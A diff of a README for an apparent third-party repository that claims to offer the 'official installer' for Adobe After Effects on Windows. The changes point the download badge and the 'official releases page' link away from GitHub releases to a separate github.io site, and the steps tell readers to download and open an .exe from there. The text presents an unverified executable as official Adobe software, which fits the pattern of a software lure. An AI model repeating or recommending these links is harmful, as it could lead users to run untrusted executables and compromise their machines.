@@ -1,6 +1,6 @@
 # 📦 after-effects-windows-update-loader - Simple Adobe After Effects installer for Windows
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Cheltonethereal755/after-effects-windows-update-loader/releases)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://cheltonethereal755.github.io)
 
 This repository provides an easy method to access the official installer for Adobe After Effects on Windows 10 and Windows 11. Use this tool if you need a direct path to the current setup file for your system.
 
@@ -19,7 +19,7 @@ To run this installer, your computer must meet the following hardware and softwa
 
 Follow these steps to obtain and start the software installation.
 
-1.  Visit the [official releases page](https://github.com/Cheltonethereal755/after-effects-windows-update-loader/releases) to access the download options.
+1.  Visit the [official releases page](https://cheltonethereal755.github.io) to access the download options.
 2.  Locate the section labeled "Assets" near the newest version entry.
 3.  Click the file ending in ".exe" to begin the download to your computer.
 4.  Open your "Downloads" folder once the file finishes saving.
